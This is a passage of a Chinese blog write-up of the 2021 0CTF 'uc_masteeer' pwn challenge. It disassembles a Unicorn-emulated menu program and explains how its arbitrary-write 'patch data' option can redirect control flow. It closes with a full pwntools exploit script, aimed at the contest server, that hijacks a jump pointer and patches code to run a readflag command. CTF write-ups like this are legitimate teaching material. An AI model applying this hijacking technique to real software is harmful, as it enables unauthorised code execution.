+    print(&quot;0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str))</code></pre>
+<p>一开始的解析并不完全，因为中间还有数据，capstone遇到数据就停止了，但是看到解析后的结果中出现多次call 0xdeadbeef1fd，可以再对其反编译一次</p>
+<pre><code class="python">start = 0x1fd
+for i in md.disasm(MAIN[start:], CODE+start):
+    print(&quot;0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str))</code></pre>
+<p>得到的完整反编译的MAIN代码，最后经过一点一点的人工解析得到：</p>
+<pre><code class="python">MAIN =&gt;
+
+0xdeadbeef000:    sub    rsp, 0x20
+0xdeadbeef004:    mov    word ptr [rsp + 0xe], 0
+0xdeadbeef00b:    lea    rbx, [rsp + 0xe]
+0xdeadbeef010:    mov    qword ptr [rsp + 0x10], 0
+0xdeadbeef019:    mov    qword ptr [rsp + 0x18], 0
+
+------------------------------------------------------------
+
+choose =&gt; # 选择功能1/2/3
+
+0xdeadbeef022:    mov    ecx, 0x44
+0xdeadbeef027:    lea    rdx, [rip + 0x18b]
+0xdeadbeef02e:    mov    esi, 1
+0xdeadbeef033:    xor    eax, eax
+0xdeadbeef035:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef02e+0x18b, 0x44)
+# 打印 &quot;Welcome to uc_masteeer\\n1. admin test\\n2. user test\\n3. patch data\\n?: \\x00&quot;
+0xdeadbeef03a:    call    some_syscall
+
+0xdeadbeef03f:    mov    ecx, 2
+0xdeadbeef044:    mov    rdx, rbx
+0xdeadbeef047:    xor    esi, esi
+0xdeadbeef049:    xor    edi, edi
+0xdeadbeef04b:    xor    eax, eax
+
+# rbx = STACK + 0xf00 - 0x20 + 0xe
+# some_syscall(0, 0, rbx, 2)
+# 栈中指定位置读入2字节数据，可以理解成一个字符+回车
+0xdeadbeef04d:    call    some_syscall
+
+0xdeadbeef052:    mov    al, byte ptr [rsp + 0xe]
+
+# 输入的字符进行三种比较，输入的是1/2/3，也对应着菜单中的功能
+0xdeadbeef056:    cmp    al, 0x32
+0xdeadbeef058:    je    user_test
+
+------------------------------------------------------------
+
+0xdeadbeef05a:    cmp    al, 0x33
+0xdeadbeef05c:    je    patch_data
+
+------------------------------------------------------------
+
+0xdeadbeef05e:    cmp    al, 0x31
+0xdeadbeef060:    jne    exit_
+
+------------------------------------------------------------
+
+admin_test =&gt; # 函数执行前会执行hook_admin函数
+0xdeadbeef066:    mov    ecx, 0x12
+0xdeadbeef06b:    lea    rdx, [rip + 0x135]
+0xdeadbeef072:    mov    esi, 1
+0xdeadbeef077:    xor    eax, eax
+0xdeadbeef079:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef072+0x135, 0x12)
+# 打印 &quot;Powerful admin &gt;\\n\\x00&quot;
+0xdeadbeef07e:    call    some_syscall
+
+0xdeadbeef083:    add    rsp, 0x20
+0xdeadbeef087:    movabs    rdi, 0xbabecafe000
+0xdeadbeef091:    jmp    qword ptr [rdi]
+
+------------------------------------------------------------
+
+user_test =&gt;
+
+0xdeadbeef093:    mov    ecx, 0x12
+0xdeadbeef098:    lea    rdx, [rip + 0xf6]
+0xdeadbeef09f:    mov    esi, 1
+0xdeadbeef0a4:    xor    eax, eax
+0xdeadbeef0a6:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef09f+0xf6, 0x12)
+# 打印 &quot;Pathetic human &gt;\\n\\x00&quot;
+0xdeadbeef0ab:    call    some_syscall
+
+0xdeadbeef0b0:    add    rsp, 0x20
+0xdeadbeef0b4:    movabs    rdi, 0xbabecafe000
+0xdeadbeef0be:    jmp    qword ptr [rdi]
+
+------------------------------------------------------------
+
+patch_data =&gt;
+
+0xdeadbeef0c0:    mov    ecx, 7
+0xdeadbeef0c5:    lea    rdx, [rip + 0xc2]
+0xdeadbeef0cc:    mov    esi, 1
+0xdeadbeef0d1:    xor    eax, eax
+0xdeadbeef0d3:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef0cc+0xc2, 7)
+# 打印 &quot;addr: \\x00&quot;
+0xdeadbeef0d8:    call    some_syscall
+
+0xdeadbeef0dd:    xor    esi, esi
+0xdeadbeef0df:    xor    edi, edi
+0xdeadbeef0e1:    lea    rdx, [rsp + 0x10]
+0xdeadbeef0e6:    mov    ecx, 8
+0xdeadbeef0eb:    xor    eax, eax
+
+# some_syscall(0, 0, [rsp + 0x10], 8)
+# 栈中指定位置读入8字节数据
+0xdeadbeef0ed:    call    some_syscall
+
+0xdeadbeef0f2:    mov    ecx, 7
+0xdeadbeef0f7:    mov    esi, 1
+0xdeadbeef0fc:    xor    eax, eax
+0xdeadbeef0fe:    lea    rdx, [rip + 0x82]
+0xdeadbeef105:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef105+0x82, 7)
+# 打印 &quot;size: \\x00&quot;
+0xdeadbeef10a:    call    some_syscall
+
+0xdeadbeef10f:    xor    esi, esi
+0xdeadbeef111:    xor    edi, edi
+0xdeadbeef113:    xor    eax, eax
+0xdeadbeef115:    lea    rdx, [rsp + 0x18]
+0xdeadbeef11a:    mov    ecx, 8
+
+# some_syscall(0, 0, [rsp + 0x18], 8)
+# 栈中指定位置读入8字节数据
+0xdeadbeef11f:    call    some_syscall
+
+# size大于0xff，进入choose，否则向下👇
+0xdeadbeef124:    cmp    qword ptr [rsp + 0x18], 0xff
+0xdeadbeef12d:    ja    choose
+
+------------------------------------------------------------
+
+0xdeadbeef133:    mov    ecx, 7
+0xdeadbeef138:    lea    rdx, [rip + 0x41]
+0xdeadbeef13f:    mov    esi, 1
+0xdeadbeef144:    xor    eax, eax
+0xdeadbeef146:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef13f+0x41, 7)
+# 打印 &quot;data: \\x00&quot;
+0xdeadbeef14b:    call    some_syscall
+
+0xdeadbeef150:    mov    rcx, qword ptr [rsp + 0x18] # size
+0xdeadbeef155:    xor    esi, esi
+0xdeadbeef157:    xor    edi, edi
+0xdeadbeef159:    mov    rdx, qword ptr [rsp + 0x10] # addr
+0xdeadbeef15e:    xor    eax, eax
+
+# some_syscall(0, 0, addr, size)
+# 向addr的位置读入size个字符
+0xdeadbeef160:    call    some_syscall
+
+0xdeadbeef165:    jmp    choose
+
+------------------------------------------------------------
+
+exit_ =&gt;
+0xdeadbeef16a:    mov    esi, 0xff
+0xdeadbeef16f:    mov    edi, 0x3c
+0xdeadbeef174:    xor    eax, eax
+
+# some_syscall(0x3c, 0xff, ...)
+# exit(-1)
+0xdeadbeef176:    call    some_syscall
+0xdeadbeef17b:    jmp    choose
+
+------------------------------------------------------------
+
+some_syscall =&gt;
+0xdeadbeef1fd:    mov    rax, rdi
+0xdeadbeef200:    mov    rdi, rsi
+0xdeadbeef203:    mov    rsi, rdx
+0xdeadbeef206:    mov    rdx, rcx
+0xdeadbeef209:    mov    r10, r8
+0xdeadbeef20c:    mov    r8, r9
+0xdeadbeef20f:    mov    r9, qword ptr [rsp + 8]
+0xdeadbeef214:    syscall    
+0xdeadbeef216:    ret</code></pre>
+<p>通过分析这段MAIN，得到程序基本流程如下：</p>
+<ul>
+<li>3个功能的菜单：1. admin test/2. user test/3. patch data<ul>
+<li>admin test ：跳到CODE+0x1000的位置执行代码</li>
+<li>user test ：跳到CODE+0x1000的位置执行代码</li>
+<li>patch data：对任意地址写0xff以内字节的数据</li>
+</ul>
+</li>
+</ul>
+<p>再来看看ADMIN的代码：</p>
+<pre><code class="python">start = 0
+for i in md.disasm(ADMIN[start:], CODE+0x1000+start):
+    print(&quot;0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str))
+
+start = 0x80
+for i in md.disasm(ADMIN[start:start+0x1a], CODE+0x1000+start):
+    print(&quot;0x%x:\\t%s\\t%s&quot; %(i.address, i.mnemonic, i.op_str))</code></pre>
+<p>解析如下所示：</p>
+<pre><code class="python">0xdeadbef0000:    mov    ecx, 0x10
+0xdeadbef0005:    lea    rdx, [rip + 0x37]
+0xdeadbef000c:    xor    eax, eax
+0xdeadbef000e:    mov    esi, 1
+0xdeadbef0013:    mov    edi, 1
+0xdeadbef0018:    sub    rsp, 8
+
+# 打印数据
+0xdeadbef001c:    call    0xdeadbef0080
+
+0xdeadbef0021:    lea    rax, [rip + 0x2b]
+0xdeadbef0028:    movabs    qword ptr [0xbabecafe233], rax
+0xdeadbef0032:    add    rsp, 8
+
+# 跳转到TAIL
+0xdeadbef0036:    movabs    rdi, 0xbabecafe000
+0xdeadbef0040:    jmp    qword ptr [rdi + 8]
+
+0xdeadbef0080:    mov    rax, rdi
+0xdeadbef0083:    mov    rdi, rsi
+0xdeadbef0086:    mov    rsi, rdx
+0xdeadbef0089:    mov    rdx, rcx
+0xdeadbef008c:    mov    r10, r8
+0xdeadbef008f:    mov    r8, r9
+0xdeadbef0092:    mov    r9, qword ptr [rsp + 8]
+0xdeadbef0097:    syscall    
+0xdeadbef0099:    ret</code></pre>
+<p>关键在于这两句：</p>
+<pre><code class="python">0xdeadbef0021:    lea    rax, [rip + 0x2b]
+0xdeadbef0028:    movabs    qword ptr [0xbabecafe233], rax</code></pre>
+<p>此时的rip+0x2b地址为0xdeadbef0053，值为：<code>k33nlabecho &#39;more important than knowledge.&#39;</code></p>
+<p>这里会触发hook_mem_access，把写入的值也就是此时的rax当成地址，解析里面的数据，所以如果你用admin功能，程序就会echo出这段话。</p>
+<p>注意要记得，<strong>hook_mem_access执行完了，is_admin就是False了！！</strong></p>
+<p>TAIL的代码功能是判断是否继续回到菜单，不再详细说明</p>
+<pre><code class="python">0xdeadbef1000:    xor    eax, eax
+0xdeadbef1002:    mov    ecx, 0x32
+0xdeadbef1007:    lea    rdx, [rip + 0x55]
+0xdeadbef100e:    mov    esi, 1
+0xdeadbef1013:    mov    edi, 1
+0xdeadbef1018:    sub    rsp, 0x18
+0xdeadbef101c:    mov    word ptr [rsp + 0xe], ax
+0xdeadbef1021:    xor    eax, eax
+
+# some_syscall(1, 1, 0xdeadbef100e+0x55, 0x32)
+# 输出&quot;Congratulations! Test succeed!\nTry again? (y/[n])\x00&quot;
+0xdeadbef1023:    call    some_syscall
+
+0xdeadbef1028:    xor    esi, esi
+0xdeadbef102a:    xor    edi, edi
+0xdeadbef102c:    xor    eax, eax
+0xdeadbef102e:    lea    rdx, [rsp + 0xe]
+0xdeadbef1033:    mov    ecx, 2
+
+# some_syscall(0, 0, rsp+0xe, 2)
+# 输入选择, y或其他
+0xdeadbef1038:    call    some_syscall
+
+0xdeadbef103d:    cmp    byte ptr [rsp + 0xe], 0x79
+0xdeadbef1042:    jne    exit_
+
+------------------------------------------------------------
+
+0xdeadbef1044:    add    rsp, 0x18
+0xdeadbef1048:    movabs    rdi, 0xbabecafe000
+0xdeadbef1052:    jmp    qword ptr [rdi + 0x10] # 跳转到CODE+0x1000的位置
+
+------------------------------------------------------------
+
+exit_ =&gt;
+0xdeadbef1055:    xor    esi, esi
+0xdeadbef1057:    mov    edi, 0x3c
+0xdeadbef105c:    xor    eax, eax
+0xdeadbef105e:    call    some_syscall
+
+
+some_syscall =&gt;
+0xdeadbef1095:    mov    rax, rdi
+0xdeadbef1098:    mov    rdi, rsi
+0xdeadbef109b:    mov    rsi, rdx
+0xdeadbef109e:    mov    rdx, rcx
+0xdeadbef10a1:    mov    r10, r8
+0xdeadbef10a4:    mov    r8, r9
+0xdeadbef10a7:    mov    r9, qword ptr [rsp + 8]
+0xdeadbef10ac:    syscall    
+0xdeadbef10ae:    ret</code></pre>
+<p>整理一下上面的所有信息</p>
+<ul>
+<li>0xdeadbeef066会触发admin_hook，ADMIN被拷贝到CODE+0x1000，同时is_admin=True，然后程序跳到CODE+0x1000执行</li>
+<li>0xdeadbef0028的时候，如果is_admin=True，那么可以触发hook_mem_access，但是地址不可控，同时执行之后is_admin=False</li>
+</ul>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>所以我们需要做的事情就是既要触发0xdeadbeef066处的admin_hook，但是又不能让程序执行到0xdeadbef0028的位置，然后跳到一个类似这样的位置来完成利用：</p>
+<pre><code class="python">lea    rax, [k33nlab/readflag&#39;s address]
+movabs    qword ptr [0xbabecafe233], rax</code></pre>
+<p>所以一定要在0xdeadbeef066-0xdeadbef0028这段程序执行过程之间来找答案！</p>
+<p>让我们来再次观察一下admin_test的代码：</p>
+<pre><code class="python">admin_test =&gt; # 函数执行前会执行hook_admin函数
+0xdeadbeef066:    mov    ecx, 0x12
+0xdeadbeef06b:    lea    rdx, [rip + 0x135]
+0xdeadbeef072:    mov    esi, 1
+0xdeadbeef077:    xor    eax, eax
+0xdeadbeef079:    mov    edi, 1
+
+# some_syscall(1, 1, 0xdeadbeef072+0x135, 0x12)
+# 打印 &quot;Powerful admin &gt;\\n\\x00&quot;
+0xdeadbeef07e:    call    some_syscall
+
+0xdeadbeef083:    add    rsp, 0x20
+0xdeadbeef087:    movabs    rdi, 0xbabecafe000
+0xdeadbeef091:    jmp    qword ptr [rdi]</code></pre>
+<p>注意到程序跳转到CODE+0x1000是通过以下方式：</p>
+<pre><code class="python">0xdeadbeef087:    movabs    rdi, 0xbabecafe000
+0xdeadbeef091:    jmp    qword ptr [rdi]</code></pre>
+<p>0xbabecafe000是可读可写的栈地址，所以如果我们可以通过patch_data修改了里面的数据，那么就可以让程序不会跳转到CODE+0x1000了</p>
+<p>之后我们再patch_data将栈中地址改回CODE+0x1000的位置，同时修改掉CODE+0x1000的代码，将0xdeadbef0053处的值改为”k33nlab/readflag”，然后执行user_test跳转过去就可以了</p>
+<p>exp.py</p>
+<pre><code class="python">from pwn import *
+
+context.log_level = &quot;debug&quot;
+context.arch = &quot;amd64&quot;
+context.os = &quot;linux&quot;
+
+IP, PORT = &quot;111.186.59.29&quot;, 10087
+
+p = remote(IP, PORT)
+
+def patch_data(addr, size, data):
+    p.sendlineafter(&quot;?: \\x00&quot;, &quot;3&quot;)
+    p.sendafter(&quot;addr: \\x00&quot;, p64(addr))
+    p.sendafter(&quot;size: \\x00&quot;, p64(size))
+    p.sendafter(&quot;data: \\x00&quot;, data)
+
+my_code = b&quot;\\x90&quot;
+p.send(my_code)
+
+CODE = 0xdeadbeef000
+STACK = 0xbabecafe000
+patch_data(STACK, 8, p64(CODE))
+
+p.sendlineafter(&quot;?: \\x00&quot;, &quot;1&quot;)
+
+patch_data(STACK, 8, p64(CODE+0x1000))
+ADMIN = b&#39;\\xb9\\x10\\x00\\x00\\x00\\x48\\x8d\\x15\\x37\\x00\\x00\\x00\\x31\\xc0\\xbe\\x01\\x00\\x00\\x00\\xbf\\x01\\x00\\x00\\x00\\x48\\x83\\xec\\x08\\xe8\\x5f\\x00\\x00\\x00\\x48\\x8d\\x05\\x2b\\x00\\x00\\x00\\x48\\xa3\\x33\\xe2\\xaf\\xec\\xab\\x0b\\x00\\x00\\x48\\x83\\xc4\\x08\\x48\\xbf\\x00\\xe0\\xaf\\xec\\xab\\x0b\\x00\\x00\\xff\\x67\\x08\\x49\\x6d\\x61\\x67\\x69\\x6e\\x61\\x74\\x69\\x6f\\x6e\\x20\\x69\\x73\\x20\\x00\\x6b\\x33\\x33\\x6e\\x6c\\x61\\x62\\x65\\x63\\x68\\x6f\\x20\\x27\\x6d\\x6f\\x72\\x65\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x61\\x6e\\x74\\x20\\x74\\x68\\x61\\x6e\\x20\\x6b\\x6e\\x6f\\x77\\x6c\\x65\\x64\\x67\\x65\\x2e\\x27\\x00\\x48\\x89\\xf8\\x48\\x89\\xf7\\x48\\x89\\xd6\\x48\\x89\\xca\\x4d\\x89\\xc2\\x4d\\x89\\xc8\\x4c\\x8b\\x4c\\x24\\x08\\x0f\\x05\\xc3&#39;.ljust(0x1000, b&#39;\\xf4&#39;)
+payload = ADMIN[:0x53] + b&quot;k33nlab/readflag\\x00&quot;
+patch_data(CODE+0x1000, len(payload), payload)
+
+p.sendlineafter(&quot;?: \\x00&quot;, &quot;2&quot;)
+
+p.interactive()</code></pre>
+<p><img src="/2021-0CTF-uc_masteeer/image-20210707151309780.png" alt="image-20210707151309780"></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1037178204@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>2021-0CTF-uc_masteeer</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="t1an5t">t1an5t</a></p>
+    <p><span class="copy-title">发布时间:</span>2021-07-06, 10:01:00</p>
+    <p><span class="copy-title">最后更新:</span>2021-07-07, 15:15:54</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2021-0CTF-uc_masteeer/" title="2021-0CTF-uc_masteeer">http://tianstcht.github.io/2021-0CTF-uc_masteeer/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2021 t1an5t</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#pwnable','#ctf','#2019','#reverse','#writeup','#elf','#kernel','#qemu','#glibc','#tw','#pwntools',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
